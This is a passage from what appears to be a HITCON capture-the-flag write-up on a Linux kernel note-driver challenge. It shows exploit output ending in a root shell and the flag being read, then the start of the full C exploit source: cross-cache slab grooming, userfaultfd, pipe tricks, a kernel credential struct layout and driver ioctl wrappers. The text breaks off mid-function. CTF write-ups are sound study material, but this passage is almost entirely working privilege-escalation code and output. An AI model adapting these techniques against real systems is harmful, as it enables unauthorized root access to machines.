0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
0000000000000000
pipe 0, offset +0x0240: cookie 529d1fb9167cb1a3
unblocking 0x7f8a4d7ac000 (copying 0x1000 bytes from 0x7f8a4d7a9000)done
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 0
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
uid: 1000
/home/note # id
uid=0(root) gid=0 groups=1000
/home/note # cat /root/flag
hitcon{R4c3_Bl0ck_Bl0ck_Bl0ck_70_r00t}
</code></pre></div></div>
<hr />

<h2 id="appendix-full-exploit">Appendix: full exploit</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;limits.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdnoreturn.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/msg.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/timerfd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/capability.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/xattr.h&gt;</span><span class="cp">
</span>
<span class="cm">/* musl is stupid btw */</span>
<span class="cp">#undef NGROUPS_MAX
#undef _IOC
#undef _IO
#undef _IOR
#undef _IOW
#undef _IOWR
</span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/io_uring.h&gt;</span><span class="cp">
</span>
<span class="cp">#define CC_OVERFLOW_FACTOR 8
</span><span class="k">enum</span> <span class="p">{</span>
    <span class="n">CC_RESERVE_PARTIAL_LIST</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">CC_ALLOC_VICTIM_PAGE</span><span class="p">,</span>
    <span class="n">CC_FILL_VICTIM_PAGE</span><span class="p">,</span>
    <span class="n">CC_EMPTY_VICTIM_PAGE</span><span class="p">,</span>
    <span class="n">CC_OVERFLOW_PARTIAL_LIST</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">cross_cache</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">;</span>
    <span class="k">struct</span>
    <span class="p">{</span>
        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">overflow_objs</span><span class="p">;</span>
        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">pre_victim_objs</span><span class="p">;</span>
        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">post_victim_objs</span><span class="p">;</span>
    <span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">phase</span><span class="p">;</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">allocate</span><span class="p">)();</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">free</span><span class="p">)(</span><span class="kt">int64_t</span><span class="p">);</span>
<span class="p">};</span>

<span class="cp">#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
</span><span class="c1">// n must be a power of 2</span>
<span class="cp">#define ALIGN(x, n) ((x) + (-(x) &amp; ((n)-1)))
</span>
<span class="cp">#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
</span>
<span class="k">typedef</span> <span class="kt">uint8_t</span> <span class="n">u8</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">uint16_t</span> <span class="n">u16</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">u32</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">uint64_t</span> <span class="n">u64</span><span class="p">;</span>

<span class="cp">#define IOC_MAGIC '\xFF'
</span>
<span class="cp">#define IO_ADD _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL _IOWR(IOC_MAGIC, 3, struct ioctl_arg)
</span>
<span class="k">struct</span> <span class="n">ioctl_arg</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">static</span> <span class="n">noreturn</span> <span class="kt">void</span> <span class="nf">fatal</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">userfault_fd</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="n">userfault_page</span><span class="p">;</span>

<span class="k">static</span> <span class="n">pthread_t</span> <span class="n">userfault_pthread</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">note_fd</span><span class="p">;</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">kmalloc96_cc</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">n_queues</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">kernel_cred</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">usage</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">uid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">gid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">suid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">sgid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">euid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">egid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">fsuid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">fsgid</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">securebits</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">cap_inheritable</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">cap_permitted</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">cap_effective</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">cap_bset</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">cap_ambient</span><span class="p">;</span>
    <span class="cm">/* ... not relevant*/</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">pipe_pair</span> <span class="p">{</span>
    <span class="k">union</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="p">{</span>
            <span class="kt">int</span> <span class="n">read</span><span class="p">;</span>
            <span class="kt">int</span> <span class="n">write</span><span class="p">;</span>
        <span class="p">};</span>
        <span class="kt">int</span> <span class="n">__raw</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="p">};</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">user_cap_data_struct</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">effective</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">permitted</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">inheritable</span><span class="p">;</span>
<span class="p">};</span>

<span class="cm">/* cross-cache stuff */</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_allocate</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
                                  <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
                                  <span class="kt">uint32_t</span> <span class="n">to_alloc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_alloc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">int64_t</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">allocate</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ref</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ref</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
                              <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
                              <span class="kt">uint32_t</span> <span class="n">to_free</span><span class="p">,</span>
                              <span class="n">bool</span> <span class="n">per_slab</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_free</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">per_slab</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="n">cc</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
            <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
 * Reserve enough objects to later overflow the per-cpu partial list */</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">reserve_partial_list_amount</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
    <span class="n">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">allocate_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">fill_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">empty_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">overflow_partial_list</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">free_all</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int64_t</span> <span class="nf">cc_next</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">CC_RESERVE_PARTIAL_LIST</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">reserve_partial_list_amount</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_ALLOC_VICTIM_PAGE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">allocate_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_FILL_VICTIM_PAGE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">fill_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_EMPTY_VICTIM_PAGE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_OVERFLOW_PARTIAL_LIST</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">overflow_partial_list</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="nl">default:</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">cc_deinit</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">free_all</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="nf">cc_init</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">,</span>
                            <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">,</span>
                            <span class="kt">void</span> <span class="o">*</span><span class="n">allocate_fptr</span><span class="p">,</span>
                            <span class="kt">void</span> <span class="o">*</span><span class="n">free_fptr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cc</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"init_cross_cache:malloc</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">=</span> <span class="n">objs_per_slab</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">=</span> <span class="n">cpu_partial</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">free</span> <span class="o">=</span> <span class="n">free_fptr</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">allocate</span> <span class="o">=</span> <span class="n">allocate_fptr</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span> <span class="o">=</span> <span class="n">CC_RESERVE_PARTIAL_LIST</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">n_overflow</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">n_previctim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">n_postvictim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_overflow</span><span class="p">);</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_previctim</span><span class="p">);</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_postvictim</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">cc</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">pin_cpu</span><span class="p">(</span><span class="kt">int</span> <span class="n">cpu</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">cpu_set_t</span> <span class="n">cpuset</span><span class="p">;</span>
    <span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpuset</span><span class="p">);</span>
    <span class="n">CPU_SET</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cpuset</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">sched_setaffinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">cpuset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cpuset</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">rlimit_increase</span><span class="p">(</span><span class="kt">int</span> <span class="n">rlimit</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">r</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">getrlimit</span><span class="p">(</span><span class="n">rlimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">))</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"rlimit_increase:getrlimit"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] rlimit %d remains at %.lld"</span><span class="p">,</span> <span class="n">rlimit</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">=</span> <span class="n">setrlimit</span><span class="p">(</span><span class="n">rlimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">))</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"rlimit_increase:setrlimit"</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] rlimit %d increased to %lld"</span><span class="p">,</span> <span class="n">rlimit</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">note_add</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">arg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">data</span><span class="p">,</span>
        <span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">note_fd</span><span class="p">,</span> <span class="n">IO_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"add"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">note_edit</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">arg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span><span class="p">,</span>
